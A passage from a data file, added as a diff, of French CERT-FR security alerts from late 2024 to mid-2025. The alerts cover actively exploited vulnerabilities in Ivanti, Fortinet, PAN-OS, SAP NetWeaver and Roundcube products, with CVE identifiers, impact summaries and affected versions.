+Une preuve de concept permettant l'exploitation de ces deux vulnérabilités est disponible publiquement.",2024-11-15T10:12:30.738174,Palo Alto Networks PAN-OS – PAN-OS versions 11.1.0 antérieures à 11.1.5-h1 | Palo Alto Networks PAN-OS – PAN-OS versions 11.0.0 antérieures à 11.0.6-h1 | Palo Alto Networks PAN-OS – PAN-OS versions 10.2.0 antérieures à 10.2.12-h2 | Palo Alto Networks PAN-OS – PAN-OS versions 11.2.0 antérieures à 11.2.4-h1
+CERTFR-2025-ALE-001,[MàJ] Vulnérabilité dans les produits Ivanti,,CVE-2025-0282,Exécution de code arbitraire à distance,"Une vulnérabilité jourzéro de type débordement de pile a été découverte dans Ivanti Connect Secure (ICS), Policy Secure (IPS), Neurons for Zero Trust Access (ZTA) gateways. Cette vulnérabilité, d'identifiant CVE20250282, permet à un attaquant non authentifié de provoquer une exécution de code arbitraire à distance.
+
+Ivanti indique que cette vulnérabilité est activement exploitée.",2025-01-09T08:36:57.656239,Ivanti Neurons for Zero Trust Access (ZTA) gateways – Neurons for ZTA gateways versions 22.7R2.x antérieures à 22.7R2.5. | Ivanti Policy Secure (IPS) – Policy Secure (IPS) toutes versions 22.7R1.x | Ivanti Connect Secure (ICS) – Connect Secure (ICS) versions 22.7R2.x antérieures à 22.7R2.5
+CERTFR-2025-ALE-002,[MàJ] Vulnérabilité dans les produits Fortinet,2025-05-07,CVE-2024-55591,Exécution de code arbitraire à distance; Contournement de la politique de sécurité,"\[Mise à jour du 28 janvier 2025\]
+
+Une preuve de concept permettant l'exploitation de cette vulnérabilité est disponible publiquement. 
+
+Le 14 janvier 2025, Fortinet a publié un avis de sécurité concernant la vulnérabilité critique CVE202455591 affectant FortiOS et FortiProxy. Elle permet à un attaquant distant non authentifié de contourner le mécanisme d'authentification de l'interface d'administration d'un équipement FortiOS ou FortiProxy et d'obtenir des privilèges superadministrateur via l'envoi de requêtes forgées au module websocket Node.js.
+
+Le CERTFR rappelle que l'exposition d'une interface d'administration sur Internet est contraire aux bonnes pratiques.
+Le CERTFR recommande donc fortement d'appliquer le correctif dans les plus brefs délais.
+Fortinet indique que cette vulnérabilité est activement exploitée.",2025-05-07T00:00:00.000000,Fortinet FortiOS – FortiOS versions 7.0.x antérieures à 7.0.17 | Fortinet FortiProxy – FortiProxy versions 7.0.x antérieures à 7.0.20 | Fortinet FortiProxy – FortiProxy versions 7.2.x antérieures à 7.2.13
+CERTFR-2025-ALE-003,[MàJ] Vulnérabilité dans les produits Ivanti,,CVE-2025-22457,Exécution de code arbitraire à distance,"\[Mise à jour du 11 avril 2025\] 
+
+Le CERTFR a connaissance d'une preuve de concept publique permettant de provoquer une exécution de code arbitraire à distance.
+
+[Mise à jour du 04 avril 2025] 
+
+Le CERTFR a connaissance d'une preuve de concept publique permettant de provoquer un arrêt du serveur Web.
+
+[Publication initiale]
+
+Une vulnérabilité critique de type débordement de pile a été découverte dans Pulse Connect Secure, Ivanti Connect Secure (ICS), Policy Secure (IPS) et Zero Trust Access (ZTA) Gateways. Cette vulnérabilité, d'identifiant CVE202522457, permet à un attaquant non authentifié de provoquer une exécution de code arbitraire à distance.
+
+Ivanti indique que cette vulnérabilité est activement exploitée [1].
+
+La mise à jour corrective pour les ICS est disponible depuis le 11 février 2025. Dans son rapport [2], Mandiant indique avoir constaté des traces d'exploitation depuis la mimars 2025. Il peut cependant être utile d'effectuer une recherche de compromission même si les correctifs ont été préalablement installés.
+
+À titre de précision, la vulnérabilité CVE202522457 est distincte de la vulnérabilité CVE20250282, qui affecte sensiblement les mêmes produits, et qui a fait l'objet de l'alerte [CERTFR2025ALE001](https://www.cert.ssi.gouv.fr/alerte/CERTFR2025ALE001/).",2025-04-04T00:00:00.000000,Ivanti Pulse Connect Secure – Pulse Connect Secure versions antérieures à 22.7R2.6 | Ivanti Zero Trust Access gateways – Zero Trust Access Gateways versions antérieures à 22.8R2.2 | Ivanti Policy Secure (IPS) – Ivanti Policy Secure (IPS) versions antérieures à 22.7R1.4 | Ivanti Connect Secure (ICS) – Ivanti Connect Secure (ICS) versions antérieures à 22.7R2.6
+CERTFR-2025-ALE-004,Activités de post-exploitation dans Fortinet FortiGate,,Aucune,Atteinte à la confidentialité des données,"Fortinet a publié le 10 avril 2025 un billet de blogue [1] indiquant l'utilisation d'une technique de postexploitation qui permet une atteinte à la confidentialité des données de l'ensemble du système des équipements Fortigate affectés.
+Cette technique repose sur l'utilisation d'un lien symbolique déposé sur le système à la suite d'une compromission de l'équipement par exploitation, entre autres, des vulnérabilités CVE202242475 [2], CVE202327997 [3] ou CVE202421762 [4]. 
+
+Le CERTFR a connaissance d'une campagne massive, avec de nombreux équipements compromis en France. Lors d'opérations de réponse à incident, le CERTFR a pris connaissance de compromissions ayant eu lieu dès le début de l'année 2023.",2025-04-11T00:00:00.000000,Fortinet FortiOS – FortiOS versions 7.0.x antérieures à 7.0.17 | Fortinet FortiOS – FortiOS versions 7.4.x antérieures à 7.4.7 | Fortinet FortiOS – FortiOS versions 7.6.x antérieures à 7.6.2 | Fortinet FortiOS – FortiOS versions 7.2.x antérieures à 7.2.11 | Fortinet FortiOS – FortiOS versions antérieures à 6.4.16
+CERTFR-2025-ALE-005,Vulnérabilité dans SAP NetWeaver,,CVE-2025-31324,Exécution de code arbitraire à distance; Contournement de la politique de sécurité,"Le 24 avril 2025, SAP a publié un bulletin de sécurité relatif à la vulnérabilité CVE202531324 qui permet l'exécution de code arbitraire à distance pour un utilisateur non authentifié. Cette vulnérabilité est provoquée par un contournement de la politique de sécurité qui permet de télécharger des fichiers arbitraires et potentiellement exécutables sur le serveur. Elle impacte le composant Visual Composer development server, non installé par défaut mais fréquemment utilisé.
+
+Le CERTFR a connaissance de plusieurs compromissions liées à cette vulnérabilité. 
+
+
+L'accès aux détails complets concernant cette vulnérabilité ([1] [2]) nécessite un compte utilisateur pour le support SAP. Le bulletin de sécurité du 8 avril 2025 a été mis à jour pour indiquer cette nouvelle vulnérabilité sans faire mention de son exploitation active.",2025-04-28T00:00:00.000000,SAP NetWeaver – NetWeaver (Visual Composer development server) versions VCFRAMEWORK 7.50 sans le dernier correctif de sécurité
+CERTFR-2025-ALE-006,Vulnérabilité dans les produits Fortinet,,CVE-2025-32756,Exécution de code arbitraire à distance,"Le 13 mai 2025, Fortinet a publié un avis de sécurité concernant la vulnérabilité CVE202532756.  Celleci permet à un attaquant non authentifié d'exécuter du code arbitraire à distance.
+
+L'éditeur indique que cette vulnérabilité est activement exploitée. Les exploitations constatées jusqu'ici concernent les produits FortiVoice.
+
+Fortinet fournit également des marqueurs de compromission à rechercher.",2025-05-13T00:00:00.000000,Fortinet FortiRecorder – FortiRecorder versions 7.0.x antérieures à 7.0.6 | Fortinet FortiRecorder – FortiRecorder versions 7.2.x antérieures à 7.2.4 | Fortinet FortiVoice – FortiVoice versions 7.2.x antérieures à 7.2.1 | Fortinet FortiMail – FortiMail versions 7.4.x antérieures à 7.4.5 | Fortinet FortiCamera – FortiCamera versions antérieures à 2.1.4 | Fortinet FortiMail – FortiMail versions 7.0.x antérieures à 7.0.9 | Fortinet FortiNDR – FortiNDR versions 7.6.x antérieures à 7.6.1 | Fortinet FortiNDR – FortiNDR versions 7.4.x antérieures à 7.4.8 | Fortinet FortiVoice – FortiVoice versions 6.4.x antérieures à 6.4.11 | Fortinet FortiNDR – FortiNDR versions antérieures à 7.0.7 | Fortinet FortiNDR – FortiNDR versions 7.1.x à 7.2.x antérieures à 7.2.5 | Fortinet FortiRecorder – FortiRecorder versions 6.4.x antérieures à 6.4.6 | Fortinet FortiMail – FortiMail versions 7.2.x antérieures à 7.2.8 | Fortinet FortiVoice – FortiVoice versions 7.0.x antérieures à 7.0.7 | Fortinet FortiMail – FortiMail versions 7.6.x antérieures à 7.6.3
+CERTFR-2025-ALE-007,Multiples vulnérabilités dans Ivanti Endpoint Manager Mobile (EPMM),,CVE-2025-4427; CVE-2025-4428,Exécution de code arbitraire à distance; Contournement de la politique de sécurité,"[Mise à jour du 15 mai 2025]
+Une preuve de concept est publiquement disponible sur Internet.
+
+[Publication initiale]
+Le 13 mai 2025, Ivanti a publié deux avis de sécurité concernant les vulnérabilités CVE20254427 et CVE20254428. L'utilisation combinée de ces deux vulnérabilités permet l'exécution de code arbitraire à distance pour un utilisateur non authentifié. 
+
+Ivanti indique que ces vulnérabilités sont activement exploitées.",2025-05-14T00:00:00.000000,Ivanti Endpoint Manager Mobile (EPMM) – Endpoint Manager Mobile versions 11.12.0.x antérieures à 11.12.0.5 | Ivanti Endpoint Manager Mobile (EPMM) – Endpoint Manager Mobile versions 12.5.0.x antérieures à 12.5.0.1 | Ivanti Endpoint Manager Mobile (EPMM) – Endpoint Manager Mobile versions 12.3.0.x antérieures à 12.3.0.2 | Ivanti Endpoint Manager Mobile (EPMM) – Endpoint Manager Mobile versions 12.4.0.x antérieures à 12.4.0.2
+CERTFR-2025-ALE-008,[MàJ] Vulnérabilité dans Roundcube,,CVE-2025-49113,Exécution de code arbitraire à distance,"[Mise à jour du 06 juin 2025]
+Une preuve de concept est publiquement disponible.
+
+[Publication initiale]
+Le 01 juin 2025, Roundcube a publié des correctifs concernant une vulnérabilité critique affectant son portail de messagerie ainsi que tous les produits l'incluant (par exemple cPanel et Plesk).
+
+Cette vulnérabilité permet à un utilisateur authentifié d'exécuter du code arbitraire à distance.
+
+L'éditeur ne mentionne pas d'identifiant CVE.
+
+Des détails techniques sur cette vulnérabilité ont été publiés avec l'identifiant CVE202549113. Le CERTFR anticipe la disponibilité imminente de codes d'exploitation et recommande fortement de mettre à jour dans les plus brefs délais au vu du nombre important de produits exposés.",2025-06-05T00:00:00.000000,Roundcube Roundcube Webmail – Roundcube Webmail versions 1.6.x antérieures à 1.6.11 | Roundcube Roundcube Webmail – Roundcube Webmail versions antérieures à 1.5.10
